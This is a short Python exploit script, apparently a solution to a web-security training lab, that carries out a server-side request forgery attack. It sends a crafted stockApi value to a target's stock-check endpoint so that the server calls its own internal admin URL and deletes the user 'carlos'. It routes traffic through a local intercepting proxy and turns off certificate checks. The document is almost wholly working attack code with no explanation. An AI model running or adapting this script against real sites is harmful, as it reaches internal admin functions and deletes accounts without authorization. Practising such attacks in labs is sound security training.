import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
    'https': 'https://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080',
    } 

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
args = parser.parse_args()

def ssrf():
    url = args.target + "product/stock"
    print(f"The target is: " + url)
    payload = "http://localhost/admin/delete?username=carlos&storeId=1"
    param = {'stockApi': payload}
    print(f"The SSRF payload is: " + str(param))
    print("(+) Sending malicious payload to delete user...")
    r = requests.post(url, data = param, verify=False, proxies=proxies)
    print(f"The status code for this request is: " + str(r.status_code))
    print(r.content)

if __name__ == "__main__":
    ssrf()
